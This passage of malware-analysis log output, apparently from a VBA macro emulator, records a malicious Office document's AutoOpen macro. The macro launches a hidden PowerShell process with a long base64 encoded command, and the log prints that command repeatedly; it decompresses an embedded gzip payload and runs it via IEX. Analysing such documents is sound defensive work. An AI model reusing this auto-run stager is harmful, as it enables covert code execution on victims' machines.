ZAFAAVQAxAHEAYgBEAE4ARwByAEwAMwBIAHMANQBkADEANAA2ACsAMQA0AHMAWAB5AEwAYgBlAFEAagBpACsASABXAFEAbQBkAFcAegBUAHEAawBJAHcAeQBsAGcAdwA1ADQAeABMAEYAYQBwADUAMgB5AC8ANQA1AGMAWAA2AG8AOQAzAGIAKwBhAFIAUQAwAHcAYgAxADAAUwBIADQATQBEADEARgBCAHoARQBwAG8AYgBEADIAZwBBADUAdQBvAFgAbgAyAEEAQwAxAFkAZwBqAHAAYwAzAGIARgBNAGoAZwBSAFkAQgBJAEYARABuAFgAMQBCAGYAUgBpADkANABoAEwAdAAwADUAawBXAFYAVwB3ACsALwB5ADcAZABsADkASwBNAGsANgB1ADQAUAA2AHUAVQB1AG0AagBFAGsAaABOAFMAVgBDAHUAWABqAGoAeABPADMAQgBJAE8AVwAvAE8ANQBpAEMAYwBuADcAegAvAFEASwA0AHkALwBIADQAaQBXAEwAbgB3AHYAZgBBAEoAVgBYAFYAcwA0AFIAMABpACsASgBVAEEAdgBoACsANABXAHIAaQA1AGUAYwA2AEgARwBPAEkAcABUAGQAMwBRAHoAUABXACsAVQBuAFMAVgBrAHMAQQBKAFIATgB3AGcAegBkAEsANQBDAEMASgBjAGYAdgBrAG4AUAArAGQAdAByADUAcABoADkAWgBlAEcANgBsAGUAdABpADgANAA1AFAAVwBjAC8AdgBsAEwAUABLADkAZgBVAFgAdwBvADMANQBjAEsARgBQAGQAbgA4AHEAeABxAFoAbABvADYARABiAFAAMwBYAHAANgBHAEgARABkAFAAQgB2AGQAUgBCAHQAcQBsAGQAQwBWAC8ANgBMAEcAZgBZAHMASABDAE8AUgArADAAcQBKAG8ATwBmAHAAZQBKAGwAQQBlAHUAOQBDAHoAcgBGAEQATgBEAG4AbgA5AFYANAAyAHkAVAB2AHUAdAB6AFoATwBWAGEARAB2AEkAZgBnAEYAVgBDAGkALwBLAE0AegA1AHgAeQBXAGkAcQBJAGoAWQBSAHYAdwBPADcAOABEAFQAVwA4AE4ATwBHAGIANABLAG4AMAA1AFcAdQBsADEAOQArAHcAOQA0ADMATABYAFEAbQBGAFkAcABhAFkAUgBuAEgATwB0AFMAaQBrAFkAVwBWAGkAdgBVAHEAdwBUAG0AcABjAGwATgBpAEoAdQBQAGkAegArADQANgA0AFUAVwBjAFQAVQBVAEUAaQB1ADUAbAA3AEsAbgAwAEIANgAyAGIAcgByAE8AbgBCAGkASQBnADIAeQBDAHoAQQBzAEYAQQA5AHIASgByAEkAeQBWAEsAcgBVAHcATgBRAHgAbAB5AHIAbQA3AHUAcABDADgAVgBOAE0AdQBzAGkAeQA0AE0AaQBCAHAAUgBoAHkAQQBqAE0AWgBGAGcAcgBKAE8AQgBQAG8AMQBYAC8AbgBSADcAbQBtAFkAQwBMAGEAbgBvAFYAdABrAE0ANgByAGsARwBDAGgASABkAFMAYwB5ADQAbgBLADYAWQBaADIAVwBDAC8AKwBCADcAZQB2ADUAKwBSADgASwBEAEsAcwByAGkAQgA5AGMAQgBvAEkAbwBGAGcAdQBxAFYASQByAE0AeQBCAFEAMQA0AHIAVgBuADQAagAzAHYANwBuADMAWQA0AG4ANQB3AGMAMQB1AGcAQwArAEoATABPAFUASAA4AFoAbABMAFMAWABaAGMAYwBrAGsAdAB1ADEAeQArAHYAbQBPAFoASQB4AGMAUQBRAEUAMABJAFgASgB0AEQASQBXADQAMwBsAGIAeQBNAGwAWQByAE0AWQArAFMATABxAFgAUwBZAHQAWQBNACsASAB3AHMARABmADgAQQB2ADQASQBuAGgAWQBYAHkAQgBIADQAKwBIAGMANAArAGIAagB6AFUAKwBtAGsAdwBIADkATgBBAFEAWgA0ACsAOQBaAHAAUgBFAFkAcgBUAGcAYQBFAGEAZwBRAGUANwBOADcALwBPAEcARwBFAC8AYwBwADMAcABrAE4AKwB1ADYASgA4AFkAeQB6AEkAVQBQAC8AaQBEAHMAaQBYAEcAUABIAFQAUgA4AFYAMgBqAHYAegBNADcARgB6AGwAbAAvAHAAaQBaADEAZABTAE0ASwBEADIAcABmAGEAQQA1AFcAbwBaAEQASgBEADgAUwBZAEUALwB4AHUAeAA0AFgAeAB2AFIAaAAzADMAUwBIAG8AUABiAFkAOQBoADAAdgAwAEoAdQBhAEgAYgBiAHcAWgBhAHcAbABEAEgAagBIAGEAbgBkAEwAUgBxAHEATABRADkAZgA0AHEAbABjAGMAcgAzAHAATQBWAFIAeAArAHIAOQBaAGsAdwBsAE4AOABhAFAARABuAFIAKwBtAEIATwA2ADMAeQA0ADEAVgBjACsAegAwAHoAVgBrAFEAZAB4AGkAcwB4AE8AYQBUAHYARABWAEYARwA0AFYARAB0AEcAYgA5AE8AdQBkAE4AQQBHADgAbABnAGYAKwBZADgAdAAvAGEAMgBSAEMAbgBJAFQAYwBEAGcAcABxAGIAUwBmAHQAZgBXAFQAdABoAEUAUwBiAFMATwBQADAAOABHAFQAMwBBAGUANwBmAHIAVABlAE4AUQBlAFMAdwBvAEIAdABSAFQAOABsACsAagBLAGMARABCAGYAawBpAFoAawBpAHUANQBtAG0AVAByAE0AcgBIAHMAVABUAFcAUABQAEkAYQBqAE4AcwBCAHkAagB0AGUAbQBNAFQAcQA1AHgAQgBNAHQAMwBoAGUATABzAGIAZABuAGgAeQA5AGsAOQBSADUAcQBrAE8AdABxADMAQgBvAGoAYwBDADIAMAA1AFgAawBpAEEAWABxAEMAWABnAEoAYwBpAE0AUQBoAE4AcwBQAFEAYQArAGEARQBxAEgAdABIADMAUQBHAEQAbQBSAE4ATgA2AEsATgBHAFYAYQBDAFcAYwBwAE0AOQB1ADIATgBiAFIATgBlADEATwBXAFYAVQBlAGoAdwBUAEYAeABIAHcAUABQADkAOQB2AEgANwB0AE0AbQBsAFQAdgBpAGwASwA3AGcAVgBiAGgAdAB6AHAATgBPAEoAMwA2AG8AdAA3AG0ATgA5ADkAaABOAFYAOABhAHEAVwBUACsARQBnAHUAYgBlADcANwBYADcASgB1AEgAYQA0AFoANwBUACsAdQB6AFMAUABNADQAYQBpAC8AMABZADcAUgA0ADIAOQBwAHYASQBiAEcAZAB6AGkANQA4ADgASABlAGYAOQB4AFUAcgBiAHMAbwAyAFcAdABGADUANgAwAHcAVQB0AFMAawBKAEMATAA5AGkARQBzAEEAdQArAHQAWgBoAFoAKwBtAGkAMgA3AFAAVAA3AHIAQgB4AHAAZgBjADkAbQBUADYASABNAG4AMwBZADkASABmAEkAeABwADAALwBMAEoAUwBzAFQAUABaAEgAVwB2AGIAbgA0AHgARABMADYAWABEAG4AcQBtAGIAMwBjAFIAcAArAFYAWgBIAFcAOQBaAGQAZwBHAEYAMgBzAHoAYQBkADYAYgBTADcASwB3AGwANQBiADgAZgBEAFkAYQBtADgAZgBEAGsAOQBIAG4ARgBpAHUARgBuAC8ASAAzADkAbgAxAEwATgAxAHIAMwBoAHQAYwA5AEMASABIAHoAbgByAFYAWgBKADAAWgAxAHMANQBKADAAVgBOAHUAKwBmADIAagB2AHUAQwBXAHoAVwB3AFoAcgBtAGYAZQBUAEoAUgBUAEgAZABHAEcAZABqAEEAZQByADAAeAByAEYASgBwAHIAdQAyAC8AUABPAFEAZQBWAFgAWAB0AHcAUQBKAEgAbwBtAGUAWQByADkARwBEAC8ATQBrAFMASAB2AE8ARwA0AHQAVABmAGMASABvADgARgAxAFQAMgA5AG0AMwAyADUAQgBlAGIAbABuAHAAUQBSAFgAVQB0ACsAUgB1AGcATQBoAFUAdgB2AHQAbABoAEoASQBSAG8AZgBWAGUAZwA4AFQAZABEAEEAYgBpAHEAMAB2ADcAZgBVAG0AawBPAGwAVwB4AGQAZwBOAGoAcgBQAEoAawBDAEYAdgBLAGEATAA1AEoAYgA5ADEAagBVAHAAbwA4AFAANQBoADMARwBwAHQAagBIAHUATQBoAHMASgBoAHcAOQBVADMAawA5AFcARQA3AGYAZwB6AHQAeAAzAHYAcABXAEIAeQBhAEEANgBPAFgATABTAFAASgBrAG4ARgAwAFcASQBqAFgAcwA5AHAAUQAwAEwAcQAwADIAQwA2AE4AdwBiAE4AKwBrAFIAdwBMAFYATwBLAGgARwBhAEYANAA3AFoAYQBYAFcARwBTAFIARwA3AEsAdQAyADEAWABIAHQATQB0AHgATwBuAEEAVQAyAFUAdABqADgAVQAzADQARABNAGQASABzAFMARwBkAE4AQgA1ADgAcgBCAG4AZQBuADMAZwBZAFcASQBEAFgANABCAEgAWgBzAFUAWgBKAG4ANABJAFAARQAyAGwAbgBwAGoASwBHAFYAZABQAEIAQQBWAGMAegB0AFcANgBZAGYAbgBkAG0AZABrAGMAcQBRAGYAZwB5AEUATgBUAGkAawBZAFEAaABNAGIAdgBaAHkAdgBJADEAWQBKAG4ANgBiAFUAdwBvADkAWAArAHgAVgBaAFcAagBRAHcAMwBnAFAANwBpAGwATgAzAFoALwA2AEwAZwAvADgANABpADEASAB1ADkAZwBTAG8ARABCAFMAeQBiAHIAMQBUAEsAMgBiADMALwB2AHYASgA4AGUAMwBxADUAOQBtAG4AdgA3ADMAZgBxAEMAYQB3AHgAcgBhAHgAMgA1AFMAcwB4ACsAbABDAHgAZgB0AFgAOABTAEMAZwBJADkAOABpAEMAUwBnAFkATgB6AFAAWAA2AEUAZAB4AEEAdQBMAFEAaABVADkAZgBNAE4ARQBxAGwAegB6AHYAbgBJAHcANABjAGIARQBGAFgAQwBYADMAbgB0AFcAaQB6AGwAdQBWAHEAVwBlAFAAMABpAHcANABHADIAcgBoAHoAYwAvAFUAQwBsADkATQBTAGgAawB6AGoAMAAxAEcAWgBlAGgAZQBFAGIAdQBrAGMAawB4AG8AWgBSAHQANQBjAFgAQwBLADgAOQBsAGgAWAB3AFMAOQBmAHQAaABCAGUAOQBRAE8ASQBZACsAegBzAHkATAA1AEsAMABTAGUARwBwAHUAbgBzAHYAMABtAFgAQwA3ADgAUABTADkAZgAxADAAdABLADcAdQBXAHIAVwBYAEgAMwB3ADUATwBOAE8AVgByADUAVAArAFkASgArAEUARABrADIALwBqADgAbQA0AEkAZABOAC8AegB1ADAARwBYAGgANQBmAC8AWQBPAFgAZQA3AFEANQAzAGkAVgBDADgAVQAvAEMAZwBYAFIAbwBEADcATQBoACsAWQBiAGYASAAxAGcAbgAzAHIATQB1AFIAYwBDAHoAYwBuAGQAdwBWAFgAaABVAHkAVwAvAGUAMAB1ADMAcQBFAHkASgAvAEkAYQA2AFIAZABSADMANgBnADcAQwBZADAATwBtAEEAZAA4AHIAdwBTADcASwBMAG0ATABxAC8AUABuADEAagBVAHEAUQBlAFYAYgA4AFIAcwAyAHgAaABxAEYAOQB2AGgAdQA2AEsAcgBBAFUAUQB6ACsAVgBtAGMANgBOAFoATQBJAHcAOQB6AGUAVQBZADgARgBrAHoAdwAwAEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7'
INFO     Found possible intermediate IOC (base64): 'JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAGwAcwBhAGcAcQBJAGwANwBhADYAcwBPAEsAQwBnAHEAKwBJAEoAdgBNAFMAZQBWAEcAbQBCAFEAbABIAGMARwBrAEoAegBkAC8AMwA0AGEAMQBKAHoAcwAzAGUAeQA5AFcAMwBXAHYAVgBaAFQARABUAEgAZABQADkAOQBQAFAAOQBEAFEASwBKAG4AYwBLAEMAVQB5AE4AUwBLADYATwBxAGIAcwBWAEQAawBMAFQAZABhAGgARwBvAFgARABiAGMAMABWAEMAZgBhAFgAKwBLAEIAYQBNAHkATgBGAEkATgBwADAATgBYAG4AZQBZAHYASABxAEIAcQA3ADAAaQBYAFEAOQB3AEcARgBKAC8ARgBXADYAbQBLAEUAQQAyAFYAYgBxAE4AVQBmAEIAcQB1ADMAcABrADQAUwBxAFYAdgAyAFMAQwBXAEkAOABDAFgATAA2ADUASwBkAHoAawBVADUARQBUAEkAZwBPAC8ATwBvAGkAWQBNAFgANgAxAE0AZABtADcAZQBnAGcAYgBsAFoANQBaAHoAKwB1ADUATgBqAEsAZABsAHkAOQBmAHUAbABFAFEAWQBJAGUAYwAzADIAdAA5AFQATgBnAHcAeABMAFoAcQBtAFQAZwBzAGwAYQBsAHYAMQBIAHEAUABBADMAdwAzAFUAUQA5AFkASQA5AFIAZgAxAE8AMQByAHIAVwArADUASwByAEkAdQBZAG0AawBYAGEAWABzAEkAaQBIAFgAMABiAEcAMwBzAGEAaQBpAEwAbwBLAFoANABsAGsAbABLAHgAVAAvAC8ATABKAGEAZgA3ACsAbwB2AE4AZAA2AFAAawBCAFcAVwBpAGsAbwBhAEUAbQB6AFgAZABNAHMAcQBsAHEAbgB2ADUAVwB6AEQAUgBlAHIAaABVAGwARQB5AHQAYwBBAE4AWABZAFAAVQAxAHEAYgBEAE4ARwByAEwAMwBIAHMANQBkADEANAA2ACsAMQA0AHMAWAB5AEwAYgBlAFEAagBpACsASABXAFEAbQBkAFcAegBUAHEAawBJAHcAeQBsAGcAdwA1ADQAeABMAEYAYQBwADUAMgB5AC8ANQA1AGMAWAA2AG8AOQAzAGIAKwBhAFIAUQAwAHcAYgAxADAAUwBIADQATQBEADEARgBCAHoARQBwAG8AYgBEADIAZwBBADUAdQBvAFgAbgAyAEEAQwAxAFkAZwBqAHAAYwAzAGIARgBNAGoAZwBSAFkAQgBJAEYARABuAFgAMQBCAGYAUgBpADkANABoAEwAdAAwADUAawBXAFYAVwB3ACsALwB5ADcAZABsADkASwBNAGsANgB1ADQAUAA2AHUAVQB1AG0AagBFAGsAaABOAFMAVgBDAHUAWABqAGoAeABPADMAQgBJAE8AVwAvAE8ANQBpAEMAYwBuADcAegAvAFEASwA0AHkALwBIADQAaQBXAEwAbgB3AHYAZgBBAEoAVgBYAFYAcwA0AFIAMABpACsASgBVAEEAdgBoACsANABXAHIAaQA1AGUAYwA2AEgARwBPAEkAcABUAGQAMwBRAHoAUABXACsAVQBuAFMAVgBrAHMAQQBKAFIATgB3AGcAegBkAEsANQBDAEMASgBjAGYAdgBrAG4AUAArAGQAdAByADUAcABoADkAWgBlAEcANgBsAGUAdABpADgANAA1AFAAVwBjAC8AdgBsAEwAUABLADkAZgBVAFgAdwBvADMANQBjAEsARgBQAGQAbgA4AHEAeABxAFoAbABvADYARABiAFAAMwBYAHAANgBHAEgARABkAFAAQgB2AGQAUgBCAHQAcQBsAGQAQwBWAC8ANgBMAEcAZgBZAHMASABDAE8AUgArADAAcQBKAG8ATwBmAHAAZQBKAGwAQQBlAHUAOQBDAHoAcgBGAEQATgBEAG4AbgA5AFYANAAyAHkAVAB2AHUAdAB6AFoATwBWAGEARAB2AEkAZgBnAEYAVgBDAGkALwBLAE0AegA1AHgAeQBXAGkAcQBJAGoAWQBSAHYAdwBPADcAOABEAFQAVwA4AE4ATwBHAGIANABLAG4AMAA1AFcAdQBsADEAOQArAHcAOQA0ADMATABYAFEAbQBGAFkAcABhAFkAUgBuAEgATwB0AFMAaQBrAFkAVwBWAGkAdgBVAHEAdwBUAG0AcABjAGwATgBpAEoAdQBQAGkAegArADQANgA0AFUAVwBjAFQAVQBVAEUAaQB1ADUAbAA3AEsAbgAwAEIANgAyAGIAcgByAE8AbgBCAGkASQBnADIAeQBDAHoAQQBzAEYAQQA5AHIASgByAEkAeQBWAEsAcgBVAHcATgBRAHgAbAB5AHIAbQA3AHUAcABDADgAVgBOAE0AdQBzAGkAeQA0AE0AaQBCAHAAUgBoAHkAQQBqAE0AWgBGAGcAcgBKAE8AQgBQAG8AMQBYAC8AbgBSADcAbQBtAFkAQwBMAGEAbgBvAFYAdABrAE0ANgByAGsARwBDAGgASABkAFMAYwB5ADQAbgBLADYAWQBaADIAVwBDAC8AKwBCADcAZQB2ADUAKwBSADgASwBEAEsAcwByAGkAQgA5AGMAQgBvAEkAbwBGAGcAdQBxAFYASQByAE0AeQBCAFEAMQA0AHIAVgBuADQAagAzAHYANwBuADMAWQA0AG4ANQB3AGMAMQB1AGcAQwArAEoATABPAFUASAA4AFoAbABMAFMAWABaAGMAYwBrAGsAdAB1ADEAeQArAHYAbQBPAFoASQB4AGMAUQBRAEUAMABJAFgASgB0AEQASQBXADQAMwBsAGIAeQBNAGwAWQByAE0AWQArAFMATABxAFgAUwBZAHQAWQBNACsASAB3AHMARABmADgAQQB2ADQASQBuAGgAWQBYAHkAQgBIADQAKwBIAGMANAArAGIAagB6AFUAKwBtAGsAdwBIADkATgBBAFEAWgA0ACsAOQBaAHAAUgBFAFkAcgBUAGcAYQBFAGEAZwBRAGUANwBOADcALwBPAEcARwBFAC8AYwBwADMAcABrAE4AKwB1ADYASgA4AFkAeQB6AEkAVQBQAC8AaQBEAHMAaQBYAEcAUABIAFQAUgA4AFYAMgBqAHYAegBNADcARgB6AGwAbAAvAHAAaQBaADEAZABTAE0ASwBEADIAcABmAGEAQQA1AFcAbwBaAEQASgBEADgAUwBZAEUALwB4AHUAeAA0AFgAeAB2AFIAaAAzADMAUwBIAG8AUABiAFkAOQBoADAAdgAwAEoAdQBhAEgAYgBiAHcAWgBhAHcAbABEAEgAagBIAGEAbgBkAEwAUgBxAHEATABRADkAZgA0AHEAbABjAGMAcgAzAHAATQBWAFIAeAArAHIAOQBaAGsAdwBsAE4AOABhAFAARABuAFIAKwBtAEIATwA2ADMAeQA0ADEAVgBjACsAegAwAHoAVgBrAFEAZAB4AGkAcwB4AE8AYQBUAHYARABWAEYARwA0AFYARAB0AEcAYgA5AE8AdQBkAE4AQQBHADgAbABnAGYAKwBZADgAdAAvAGEAMgBSAEMAbgBJAFQAYwBEAGcAcABxAGIAUwBmAHQAZgBXAFQAdABoAEUAUwBiAFMATwBQADAAOABHAFQAMwBBAGUANwBmAHIAVABlAE4AUQBlAFMAdwBvAEIAdABSAFQAOABsACsAagBLAGMARABCAGYAawBpAFoAawBpAHUANQBtAG0AVAByAE0AcgBIAHMAVABUAFcAUABQAEkAYQBqAE4AcwBCAHkAagB0AGUAbQBNAFQAcQA1AHgAQgBNAHQAMwBoAGUATABzAGIAZABuAGgAeQA5AGsAOQBSADUAcQBrAE8AdABxADMAQgBvAGoAYwBDADIAMAA1AFgAawBpAEEAWABxAEMAWABnAEoAYwBpAE0AUQBoAE4AcwBQAFEAYQArAGEARQBxAEgAdABIADMAUQBHAEQAbQBSAE4ATgA2AEsATgBHAFYAYQBDAFcAYwBwAE0AOQB1ADIATgBiAFIATgBlADEATwBXAFYAVQBlAGoAdwBUAEYAeABIAHcAUABQADkAOQB2AEgANwB0AE0AbQBsAFQAdgBpAGwASwA3AGcAVgBiAGgAdAB6AHAATgBPAEoAMwA2AG8AdAA3AG0ATgA5ADkAaABOAFYAOABhAHEAVwBUACsARQBnAHUAYgBlADcANwBYADcASgB1AEgAYQA0AFoANwBUACsAdQB6AFMAUABNADQAYQBpAC8AMABZADcAUgA0ADIAOQBwAHYASQBiAEcAZAB6AGkANQA4ADgASABlAGYAOQB4AFUAcgBiAHMAbwAyAFcAdABGADUANgAwAHcAVQB0AFMAawBKAEMATAA5AGkARQBzAEEAdQArAHQAWgBoAFoAKwBtAGkAMgA3AFAAVAA3AHIAQgB4AHAAZgBjADkAbQBUADYASABNAG4AMwBZADkASABmAEkAeABwADAALwBMAEoAUwBzAFQAUABaAEgAVwB2AGIAbgA0AHgARABMADYAWABEAG4AcQBtAGIAMwBjAFIAcAArAFYAWgBIAFcAOQBaAGQAZwBHAEYAMgBzAHoAYQBkADYAYgBTADcASwB3AGwANQBiADgAZgBEAFkAYQBtADgAZgBEAGsAOQBIAG4ARgBpAHUARgBuAC8ASAAzADkAbgAxAEwATgAxAHIAMwBoAHQAYwA5AEMASABIAHoAbgByAFYAWgBKADAAWgAxAHMANQBKADAAVgBOAHUAKwBmADIAagB2AHUAQwBXAHoAVwB3AFoAcgBtAGYAZQBUAEoAUgBUAEgAZABHAEcAZABqAEEAZQByADAAeAByAEYASgBwAHIAdQAyAC8AUABPAFEAZQBWAFgAWAB0AHcAUQBKAEgAbwBtAGUAWQByADkARwBEAC8ATQBrAFMASAB2AE8ARwA0AHQAVABmAGMASABvADgARgAxAFQAMgA5AG0AMwAyADUAQgBlAGIAbABuAHAAUQBSAFgAVQB0ACsAUgB1AGcATQBoAFUAdgB2AHQAbABoAEoASQBSAG8AZgBWAGUAZwA4AFQAZABEAEEAYgBpAHEAMAB2ADcAZgBVAG0AawBPAGwAVwB4AGQAZwBOAGoAcgBQAEoAawBDAEYAdgBLAGEATAA1AEoAYgA5ADEAagBVAHAAbwA4AFAANQBoADMARwBwAHQAagBIAHUATQBoAHMASgBoAHcAOQBVADMAawA5AFcARQA3AGYAZwB6AHQAeAAzAHYAcABXAEIAeQBhAEEANgBPAFgATABTAFAASgBrAG4ARgAwAFcASQBqAFgAcwA5AHAAUQAwAEwAcQAwADIAQwA2AE4AdwBiAE4AKwBrAFIAdwBMAFYATwBLAGgARwBhAEYANAA3AFoAYQBYAFcARwBTAFIARwA3AEsAdQAyADEAWABIAHQATQB0AHgATwBuAEEAVQAyAFUAdABqADgAVQAzADQARABNAGQASABzAFMARwBkAE4AQgA1ADgAcgBCAG4AZQBuADMAZwBZAFcASQBEAFgANABCAEgAWgBzAFUAWgBKAG4ANABJAFAARQAyAGwAbgBwAGoASwBHAFYAZABQAEIAQQBWAGMAegB0AFcANgBZAGYAbgBkAG0AZABrAGMAcQBRAGYAZwB5AEUATgBUAGkAawBZAFEAaABNAGIAdgBaAHkAdgBJADEAWQBKAG4ANgBiAFUAdwBvADkAWAArAHgAVgBaAFcAagBRAHcAMwBnAFAANwBpAGwATgAzAFoALwA2AEwAZwAvADgANABpADEASAB1ADkAZwBTAG8ARABCAFMAeQBiAHIAMQBUAEsAMgBiADMALwB2AHYASgA4AGUAMwBxADUAOQBtAG4AdgA3ADMAZgBxAEMAYQB3AHgAcgBhAHgAMgA1AFMAcwB4ACsAbABDAHgAZgB0AFgAOABTAEMAZwBJADkAOABpAEMAUwBnAFkATgB6AFAAWAA2AEUAZAB4AEEAdQBMAFEAaABVADkAZgBNAE4ARQBxAGwAegB6AHYAbgBJAHcANABjAGIARQBGAFgAQwBYADMAbgB0AFcAaQB6AGwAdQBWAHEAVwBlAFAAMABpAHcANABHADIAcgBoAHoAYwAvAFUAQwBsADkATQBTAGgAawB6AGoAMAAxAEcAWgBlAGgAZQBFAGIAdQBrAGMAawB4AG8AWgBSAHQANQBjAFgAQwBLADgAOQBsAGgAWAB3AFMAOQBmAHQAaABCAGUAOQBRAE8ASQBZACsAegBzAHkATAA1AEsAMABTAGUARwBwAHUAbgBzAHYAMABtAFgAQwA3ADgAUABTADkAZgAxADAAdABLADcAdQBXAHIAVwBYAEgAMwB3ADUATwBOAE8AVgByADUAVAArAFkASgArAEUARABrADIALwBqADgAbQA0AEkAZABOAC8AegB1ADAARwBYAGgANQBmAC8AWQBPAFgAZQA3AFEANQAzAGkAVgBDADgAVQAvAEMAZwBYAFIAbwBEADcATQBoACsAWQBiAGYASAAxAGcAbgAzAHIATQB1AFIAYwBDAHoAYwBuAGQAdwBWAFgAaABVAHkAVwAvAGUAMAB1ADMAcQBFAHkASgAvAEkAYQA2AFIAZABSADMANgBnADcAQwBZADAATwBtAEEAZAA4AHIAdwBTADcASwBMAG0ATABxAC8AUABuADEAagBVAHEAUQBlAFYAYgA4AFIAcwAyAHgAaABxAEYAOQB2AGgAdQA2AEsAcgBBAFUAUQB6ACsAVgBtAGMANgBOAFoATQBJAHcAOQB6AGUAVQBZADgARgBrAHoAdwAwAEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AAoA'
INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'
INFO     Emulating loose statements...
INFO     ACTION: Found Entry Point - params 'autoopen' - 
INFO     evaluating Sub AutoOpen
WARNING  Variable 'CatchMeIfYouCan' not found
INFO     Calling Procedure: Shell("['powershell -nop -w hidden -encodedcommand \\x01\\x00\\x00JABzAD0ATgBlAHcALQBPAGIA...")
INFO     Shell('powershell -nop -w hidden -encodedcommand \x01\x00\x00JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAGwAcwBhAGcAcQBJAGwANwBhADYAcwBPAEsAQwBnAHEAKwBJAEoAdgBNAFMAZQBWAEcAbQBCAFEAbABIAGMARwBrAEoAegBkAC8AMwA0AGEAMQBKAHoAcwAzAGUAeQA5AFcAMwBXAHYAVgBaAFQARABUAEgAZABQADkAOQBQAFAAOQBEAFEASwBKAG4AYwBLAEMAVQB5AE4AUwBLADYATwBxAGIAcwBWAEQAawBMAFQAZABhAGgARwBvAFgARABiAGMAMABWAEMAZgBhAFgAKwBLAEIAYQBNAHkATgBGAEkATgBwADAATgBYAG4AZQBZAHYASABxAEIAcQA3ADAAaQBYAFEAOQB3AEcARgBKAC8ARgBXADYAbQBLAEUAQQAyAFYAYgBxAE4AVQBmAEIAcQB1ADMAcABrADQAUwBxAFYAdgAyAFMAQwBXAEkAOABDAFgATAA2ADUASwBkAHoAawBVADUARQBUAEkAZwBPAC8ATwBvAGkAWQBNAFgANgAxAE0AZABtADcAZQBnAGcAYgBsAFoANQBaAHoAKwB1ADUATgBqAEsAZABsAHkAOQBmAHUAbABFAFEAWQBJAGUAYwAzADIAdAA5AFQATgBnAHcAeABMAFoAcQBtAFQAZwBzAGwAYQBsAHYAMQBIAHEAUABBADMAdwAzAFUAUQA5AFkASQA5AFIAZgAxAE8AMQByAHIAVwArADUASwByAEkAdQBZAG0AawBYAGEAWABzAEkAaQBIAFgAMABiAEcAMwBzAGEAaQBpAEwAbwBLAFoANABsAGsAbABLAHgAVAAvAC8ATABKAGEAZgA3ACsAbwB2AE4AZAA2AFAAawBCAFcAVwBpAGsAbwBhAEUAbQB6AFgAZABNAHMAcQBsAHEAbgB2ADUAVwB6AEQAUgBlAHIAaABVAGwARQB5AHQAYwBBAE4AWABZAFAAVQAxAHEAYgBEAE4ARwByAEwAMwBIAHMANQBkADEANAA2ACsAMQA0AHMAWAB5AEwAYgBlAFEAagBpACsASABXAFEAbQBkAFcAegBUAHEAawBJAHcAeQBsAGcAdwA1ADQAeABMAEYAYQBwADUAMgB5AC8ANQA1AGMAWAA2AG8AOQAzAGIAKwBhAFIAUQAwAHcAYgAxADAAUwBIADQATQBEADEARgBCAHoARQBwAG8AYgBEADIAZwBBADUAdQBvAFgAbgAyAEEAQwAxAFkAZwBqAHAAYwAzAGIARgBNAGoAZwBSAFkAQgBJAEYARABuAFgAMQBCAGYAUgBpADkANABoAEwAdAAwADUAawBXAFYAVwB3ACsALwB5ADcAZABsADkASwBNAGsANgB1ADQAUAA2AHUAVQB1AG0AagBFAGsAaABOAFMAVgBDAHUAWABqAGoAeABPADMAQgBJAE8AVwAvAE8ANQBpAEMAYwBuADcAegAvAFEASwA0AHkALwBIADQAaQBXAEwAbgB3AHYAZgBBAEoAVgBYAFYAcwA0AFIAMABpACsASgBVAEEAdgBoACsANABXAHIAaQA1AGUAYwA2AEgARwBPAEkAcABUAGQAMwBRAHoAUABXACsAVQBuAFMAVgBrAHMAQQBKAFIATgB3AGcAegBkAEsANQBDAEMASgBjAGYAdgBrAG4AUAArAGQAdAByADUAcABoADkAWgBlAEcANgBsAGUAdABpADgANAA1AFAAVwBjAC8AdgBsAEwAUABLADkAZgBVAFgAdwBvADMANQBjAEsARgBQAGQAbgA4AHEAeABxAFoAbABvADYARABiAFAAMwBYAHAANgBHAEgARABkAFAAQgB2AGQAUgBCAHQAcQBsAGQAQwBWAC8ANgBMAEcAZgBZAHMASABDAE8AUgArADAAcQBKAG8ATwBmAHAAZQBKAGwAQQBlAHUAOQBDAHoAcgBGAEQATgBEAG4AbgA5AFYANAAyAHkAVAB2AHUAdAB6AFoATwBWAGEARAB2AEkAZgBnAEYAVgBDAGkALwBLAE0AegA1AHgAeQBXAGkAcQBJAGoAWQBSAHYAdwBPA